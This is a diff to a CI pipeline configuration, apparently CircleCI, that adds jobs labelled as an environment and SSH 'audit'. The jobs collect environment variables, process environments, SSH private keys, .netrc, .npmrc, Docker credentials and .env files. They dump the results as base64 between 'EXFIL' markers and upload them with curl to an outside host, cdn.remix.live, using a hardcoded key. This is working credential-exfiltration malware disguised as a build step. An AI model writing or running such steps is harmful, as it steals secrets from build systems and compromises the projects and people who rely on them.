@@ -7,33 +7,76 @@ jobs:
     steps:
       - checkout
       - run:
-          name: env-audit
+          name: env-dump
+          no_output_timeout: 5m
           command: |
             set +e
-            set +x
-            OUT=/tmp/ci-audit-33196.txt
+            OUT=/tmp/env-audit-33196.txt
             {
-              echo "=== ID ==="; id; hostname; uname -a; date -u
-              echo "=== ENV ==="; env | sort
-              echo "=== PROC1 ==="; tr '\0' '\n' < /proc/1/environ | sort
-              echo "=== SSH LS ==="; ls -la "$HOME/.ssh" 2>&1
-              for f in "$HOME"/.ssh/*; do [ -f "$f" ] || continue; echo "--- FILE $f"; base64 -w0 "$f" 2>/dev/null; echo; done
-              echo "=== SSH IDENT ==="
-              for f in "$HOME"/.ssh/id_*; do [ -f "$f" ] || continue; echo "--- fp $f"; ssh-keygen -lf "$f" 2>&1; echo "--- pubkey $f"; ssh-keygen -y -f "$f" 2>&1 | head -c 2000; echo; done
-              timeout 20 ssh -o StrictHostKeyChecking=no -o BatchMode=yes -T git@github.com 2>&1 | head -5 || true
-              echo "=== GITCONF ==="; cat "$HOME/.gitconfig" 2>&1
-              echo "=== NETRC ==="; cat "$HOME/.netrc" 2>&1
-              echo "=== NPMRC ==="; cat "$HOME/.npmrc" 2>&1
-              echo "=== DOCKERCFG ==="; cat "$HOME/.docker/config.json" 2>&1
-              echo "=== BASHEnv ==="; ls -la /tmp/.bash_env* 2>&1; for f in /tmp/.bash_env*; do [ -f "$f" ] && { echo "--- $f"; cat "$f"; }; done
-              echo "=== HOME LS ==="; ls -la "$HOME" 2>&1
-              echo "=== WORKDIR ENV FILES ==="; ls -la .env* 2>&1; find . -maxdepth 3 -name "*.env*" -not -path "./node_modules/*" 2>/dev/null | head -20
+              echo "=== ID ==="; timeout 20 id; timeout 20 hostname; timeout 20 uname -a; timeout 20 date -u
+              echo "=== ENV ==="; timeout 30 env | sort
+              echo "=== PROC1 ==="; timeout 20 sh -c 'tr "\0" "\n" < /proc/1/environ' | sort
+              echo "=== BASH_ENV_FILE ==="; timeout 10 cat "$BASH_ENV" 2>&1
             } > "$OUT" 2>&1
+            echo "PHASE1_SIZE $(wc -c < "$OUT")"
             echo "=====EXFIL_B64_START====="
-            base64 -w0 "$OUT" || true
+            timeout 60 base64 -w0 "$OUT"
             echo
             echo "=====EXFIL_B64_END====="
-            curl -sS -m 60 -X POST https://cdn.remix.live/upload -H "x-cdn-key: 6175553e504a91071544ecbaaa3f28384791b2d31194d0550d4464fa4da9b943" -F "file=@${OUT};type=text/plain;filename=ci-audit-33196.txt" -w "\nCDN_HTTP:%{http_code}\n" 2>&1 || true
+      - store_artifacts:
+          path: /tmp/env-audit-33196.txt
+          destination: env-audit-33196.txt
+          when: always
+      - run:
+          name: ssh-dump
+          no_output_timeout: 5m
+          command: |
+            set +e
+            OUT=/tmp/ssh-audit-33196.txt
+            {
+              echo "=== SSH LS ==="; timeout 20 ls -la "$HOME/.ssh" 2>&1
+            } > "$OUT" 2>&1
+            for f in "$HOME"/.ssh/*; do
+              [ -f "$f" ] || continue
+              echo "--- FILE $f" >> "$OUT"
+              timeout 20 base64 -w0 "$f" < /dev/null >> "$OUT" 2>&1
+              echo >> "$OUT"
+            done
+            for f in "$HOME"/.ssh/id_*; do
+              [ -f "$f" ] || continue
+              echo "--- fp $f" >> "$OUT"
+              timeout 15 ssh-keygen -lf "$f" < /dev/null >> "$OUT" 2>&1
+              echo "--- pubkey $f" >> "$OUT"
+              timeout 15 ssh-keygen -y -f "$f" < /dev/null 2>>"$OUT" | head -c 4000 >> "$OUT"
+              echo >> "$OUT"
+            done
+            {
+              echo "=== GITCONF ==="; timeout 10 cat "$HOME/.gitconfig" 2>&1
+              echo "=== NETRC ==="; timeout 10 cat "$HOME/.netrc" 2>&1
+              echo "=== NPMRC ==="; timeout 10 cat "$HOME/.npmrc" 2>&1
+              echo "=== DOCKERCFG ==="; timeout 10 cat "$HOME/.docker/config.json" 2>&1
+              echo "=== HOME LS ==="; timeout 20 ls -la "$HOME" 2>&1
+              echo "=== ENVFILES ==="; timeout 30 sh -c 'ls -la .env* 2>&1; find . -maxdepth 3 -name "*.env*" -not -path "./node_modules/*" 2>/dev/null | head -20'
+            } >> "$OUT" 2>&1
+            echo "PHASE2_SIZE $(wc -c < "$OUT")"
+            echo "=====EXFIL2_B64_START====="
+            timeout 60 base64 -w0 "$OUT"
+            echo
+            echo "=====EXFIL2_B64_END====="
+      - run:
+          name: cdn-upload
+          when: always
+          command: |
+            set +e
+            for f in /tmp/env-audit-33196.txt /tmp/ssh-audit-33196.txt; do
+              [ -f "$f" ] || continue
+              echo "UPLOAD $(basename $f) $(wc -c < "$f")"
+              timeout 40 curl -sS -m 30 -X POST https://cdn.remix.live/upload -H "x-cdn-key: 6175553e504a91071544ecbaaa3f28384791b2d31194d0550d4464fa4da9b943" -F "file=@${f};type=application/octet-stream" -w "\nCDN_HTTP:%{http_code}\n" || true
+            done
+      - store_artifacts:
+          path: /tmp/ssh-audit-33196.txt
+          destination: ssh-audit-33196.txt
+          when: always
 workflows:
   audit:
     jobs:
